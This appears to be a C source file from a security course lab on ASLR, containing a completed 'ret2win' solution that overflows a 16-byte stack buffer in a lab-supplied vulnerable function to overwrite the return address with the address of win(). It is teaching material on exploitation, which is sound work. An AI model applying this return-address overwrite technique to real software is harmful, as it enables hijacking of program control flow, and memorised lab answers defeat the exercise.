/*
 * Address Space Layout Randomization
 * Part 2A: ret2win
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include "lab.h"

// Get vulnerable to call this:
extern void win();

// This is vulnerable to a buffer overflow attack:
extern void vulnerable(char *your_string);

/*
 * lab_code
 * Your code for part 1 goes here!
 */
void lab_code() {
	// The "string" we are going to use for our exploit
	// Notice this isn't a character array, but an array of 64 bit unsigned integers!
	// In C, strings are arrays of bytes. We are going to create our "string"
	// using an array of ints as a model, and then cast (convert) it to a string.
	uint64_t your_string[128];

	// Cast win to a function pointer and then to a 64 bit int
	uint64_t win_address = (uint64_t)&win;

	// Fill the array with 0xFF's and a null terminator at the end
	memset(your_string, 0xFF, sizeof(your_string));
	your_string[127] = 0x000000000000000A;

	// Part 2A: Fill in your_string such that vulnerable executes win() on exit

	// Calculate the index for the return address, considering the layout and sizes
	// We know that stackbuf is 16 bytes and we have saved RBP (8 bytes) that follows it, so our 
	// return address will start at the 24th byte. Since the array is of 64-bit int, each index 
	// accounts for 8 bytes, so we divide the byte offset by 8 to get the array index
	int ret_address_index = (16 + 8) / 8; // 16 bytes stackbuf + 8 bytes saved RBP

	// Overwrite the return address with win_address
	your_string[ret_address_index] = win_address;

	// Pass the crafted payload to vulnerable
	vulnerable((char *)your_string);
}